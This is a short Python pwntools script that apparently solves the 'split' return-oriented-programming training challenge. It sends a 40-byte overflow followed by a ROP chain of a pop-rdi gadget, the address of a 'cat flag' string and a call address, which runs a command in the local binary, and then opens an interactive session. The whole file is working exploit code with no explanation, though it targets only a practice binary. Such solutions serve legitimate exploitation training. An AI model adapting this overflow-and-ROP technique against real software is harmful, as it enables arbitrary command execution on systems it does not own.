from pwn import *

r = process("./split")

syscall = 0x000000000040074b
cat_flag = 0x00601060
pop_rdi = 0x00000000004007c3

payload = b'a'*40
payload += p64(pop_rdi)
payload += p64(cat_flag)
payload += p64(syscall)
r.sendafter('> ', payload)
r.interactive()